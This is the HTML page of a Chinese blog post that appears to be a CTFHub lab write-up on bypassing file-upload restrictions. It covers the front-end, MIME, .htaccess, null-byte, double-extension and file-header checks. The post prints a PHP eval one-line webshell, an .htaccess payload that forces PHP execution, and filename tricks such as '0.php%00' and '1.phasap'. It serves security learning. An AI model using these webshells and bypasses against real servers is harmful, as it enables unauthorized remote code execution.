@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>CTFHub-文件上传学习 - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="CTFHub-文件上传学习" />
+<meta property="og:description" content="0x00 前言 菜鸡记录汇总下文件上传的学习过程。 0x01 无验证 随便上传一个文件，得到上传文件相对路径upload/.txt，输入url后能够正常访问。写一" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" /><meta property="og:image" content="https://hannibal0x.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-02-22T16:20:00+00:00" />
+<meta property="article:modified_time" content="2021-02-22T16:20:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/logo.png"/>
+
+<meta name="twitter:title" content="CTFHub-文件上传学习"/>
+<meta name="twitter:description" content="0x00 前言 菜鸡记录汇总下文件上传的学习过程。 0x01 无验证 随便上传一个文件，得到上传文件相对路径upload/.txt，输入url后能够正常访问。写一"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="https://hannibal0x.github.io/2021-02-20-ctfhub-rce%E5%AD%A6%E4%B9%A0/" /><link rel="next" href="https://hannibal0x.github.io/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CTFHub-文件上传学习",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0\/"
+        },"genre": "posts","wordcount":  1390 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0\/","datePublished": "2021-02-22T16:20:00+00:00","dateModified": "2021-02-22T16:20:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog">Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="让我康康" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog">Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="让我康康" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CTFHub-文件上传学习</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-02-22">2021-02-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1390 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-无验证figure-classwp-block-image-size-large">0x01 无验证<figure class="wp-block-image size-large"></a></li>
+    <li><a href="#0x02-前端验证">0x02 前端验证</a></li>
+    <li><a href="#0x03-htaccess">0x03 .htaccess</a></li>
+    <li><a href="#0x04-mime绕过">0x04 MIME绕过</a></li>
+    <li><a href="#0x05-00截断">0x05 00截断</a></li>
+    <li><a href="#0x06-双写后缀">0x06 双写后缀</a></li>
+    <li><a href="#0x07-文件头检查figure-classwp-block-image-size-large">0x07 文件头检查<figure class="wp-block-image size-large"></a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>菜鸡记录汇总下文件上传的学习过程。</p>
+<h2 id="0x01-无验证figure-classwp-block-image-size-large">0x01 无验证<figure class="wp-block-image size-large"></h2>
+<p><img loading="lazy" width="520" height="148" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-28.png" alt="" class="wp-image-1648" /> </figure></p>
+<p>随便上传一个文件，得到上传文件相对路径upload/.txt，输入url后能够正常访问。写一句话木马到1.php，<code>&lt;?php @eval($_POST['cmd']);?&gt;</code>。上传后，通过菜刀或蚁剑连接。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="1279" height="299" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-29.png" alt="" class="wp-image-1652" /> </figure></p>
+<p>打开文件，找到flag。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="450" height="58" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-30.png" alt="" class="wp-image-1653" /> </figure></p>
+<h2 id="0x02-前端验证">0x02 前端验证</h2>
+<p>查看源代码可发现</p>
+<pre id="line1" class="wp-block-code"><code>function checkfilesuffix()
+{
+    var file=document.getElementsByName('file')&#91;0]&#91;'value'];
+    if(file==""||file==null)
+    {
+        alert("请添加上传文件");
+        return false;
+    }
+    else
+    {
+        var whitelist=new Array(".jpg",".png",".gif");
+        var file_suffix=file.substring(file.lastIndexOf("."));
+        if(whitelist.indexOf(file_suffix) == -1)
+        {
+            alert("该文件不允许上传");
+            return false;
+        }
+    }
+}</code></pre>
+<p>将1.php的后缀名改为合法的，再上传，然后抓包改filename。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="497" height="157" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-31.png" alt="" class="wp-image-1656" /> </figure></p>
+<p>即可绕过成功。这里也提供另一种绕过方法，直接禁用js。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="699" height="401" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-33.png" alt="" class="wp-image-1658" /> </figure></p>
+<h2 id="0x03-htaccess">0x03 .htaccess</h2>
+<p>题目：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+<p>查看源代码</p>
+<pre id="line1" class="wp-block-code"><code>if (!empty($_POST&#91;'submit'])) {
+    $name = basename($_FILES&#91;'file']&#91;'name']);
+    $ext = pathinfo($name)&#91;'extension'];
+    $blacklist = array("php", "php7", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf");
+    if (!in_array($ext, $blacklist)) {
+        if (move_uploaded_file($_FILES&#91;'file']&#91;'tmp_name'], UPLOAD_PATH . $name)) {
+            echo "&lt;script&gt;alert('上传成功')&lt;/script&gt;";
+            echo "上传文件相对路径&lt;br&gt;" . UPLOAD_URL_PATH . $name;
+        } else {
+            echo "&lt;script&gt;alert('上传失败')&lt;/script&gt;";
+        }
+    } else {
+        echo "&lt;script&gt;alert('文件类型不匹配')&lt;/script&gt;";
+    }
+}</code></pre>
+<p>写一个<code>.htaccess</code>文件，设置当前目录下所有文件都会被解析成php代码执行，内容如下。</p>
+<pre class="wp-block-code"><code>&lt;IfModule mime_module&gt;
+SetHandler application/x-httpd-php
+&lt;/IfModule&gt;</code></pre>
+<p>上传后，再上传1.png的木马文件，拿webshell连接即可得到flag。</p>
+<h2 id="0x04-mime绕过">0x04 MIME绕过</h2>
+<p>•扩展名：gif MIME类型：image/gif</p>
+<p>•扩展名：png MIME类型：image/png</p>
+<p>•扩展名：jpg MIME类型：image/jpeg</p>
+<p>•扩展名：js MIME类型：text/javascript</p>
+<p>•扩展名：htm/html MIME类型：text/html<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="537" height="199" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-34.png" alt="" class="wp-image-1660" /> </figure></p>
+<p>抓包后修改content-type字段为合法类型，上传成功，重复上面的步骤，get flag。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="475" height="97" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-35.png" alt="" class="wp-image-1662" /> </figure></p>
+<h2 id="0x05-00截断">0x05 00截断</h2>
+<p>题目：了解一下 PHP 5.2 00截断上传的原理</p>
+<pre id="line1" class="wp-block-code"><code>if (!empty($_POST&#91;'submit'])) {
+    $name = basename($_FILES&#91;'file']&#91;'name']);
+    $info = pathinfo($name);
+    $ext = $info&#91;'extension'];
+    $whitelist = array("jpg", "png", "gif");
+    if (in_array($ext, $whitelist)) {
+        $des = $_GET&#91;'road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
+        if (move_uploaded_file($_FILES&#91;'file']&#91;'tmp_name'], $des)) {
+            echo "&lt;script&gt;alert('上传成功')&lt;/script&gt;";
+        } else {
+            echo "&lt;script&gt;alert('上传失败')&lt;/script&gt;";
+        }
+    } else {
+        echo "文件类型不匹配";
+    }
+}</code></pre><figure class="wp-block-image size-large">
+<p><img loading="lazy" width="1045" height="362" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-36.png" alt="" class="wp-image-1665" /> </figure></p>
+<p>将木马文件更名为1.png.php，因为url地址栏出现了?road=/var/www/htm/ 没有返回文件的路径地址，多半是有临时文件名的存在，文件存储路径为road，在后面加上0.php%00，截断路径。上传文件就被保存到了upload/0.php下。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="819" height="376" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-38.png" alt="" class="wp-image-1670" /> </figure></p>
+<p>最后重复上面的步骤，get flag。</p>
+<h2 id="0x06-双写后缀">0x06 双写后缀</h2>
+<pre id="line1" class="wp-block-code"><code>$name = basename($_FILES&#91;'file']&#91;'name']);
+$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
+$name = str_ireplace($blacklist, "", $name);</code></pre>
+<p>这道题目会将黑名单中的后缀替换为空，更改木马后缀名为1.phasap，会替换掉asa，从而生成php。连接蚁剑，得到flag。</p>
+<h2 id="0x07-文件头检查figure-classwp-block-image-size-large">0x07 文件头检查<figure class="wp-block-image size-large"></h2>
+<p><img loading="lazy" width="734" height="583" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-39.png" alt="" class="wp-image-1677" /> </figure></p>
+<p>在恶意脚本前加上允许上传文件的头标识，同时抓包修改content-type字段。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="744" height="68" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-40.png" alt="" class="wp-image-1678" /> </figure></p>
+<p>最后重复上面的步骤，get flag。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-02-22</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" data-title="CTFHub-文件上传学习" data-via="xxxx"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" data-title="CTFHub-文件上传学习"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" data-title="CTFHub-文件上传学习"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-02-23-ctfhub-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" data-title="CTFHub-文件上传学习"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-02-20-ctfhub-rce%E5%AD%A6%E4%B9%A0/" class="prev" rel="prev" title="CTFHub-RCE学习"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CTFHub-RCE学习</a>
+            <a href="/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="next" rel="next" title="CTFHub-信息泄露">CTFHub-信息泄露<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
